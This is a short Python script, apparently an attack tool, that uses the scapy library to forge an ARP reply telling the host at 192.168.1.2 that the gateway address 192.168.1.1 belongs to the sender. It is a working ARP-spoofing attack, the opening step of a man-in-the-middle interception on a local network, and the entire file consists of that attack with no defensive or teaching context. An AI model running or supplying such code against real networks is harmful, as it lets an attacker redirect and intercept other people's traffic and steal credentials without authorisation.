from scapy.all import ARP, Ether, send, conf

def arp_spoof(target_ip, host_ip):
    packet = ARP(op=2, psrc=host_ip, pdst=target_ip)
    send(packet, verbose=False)

target_ip = '192.168.1.2'
host_ip = '192.168.1.1'
arp_spoof(target_ip, host_ip)
print(f'Spoofing ARP for {target_ip}')
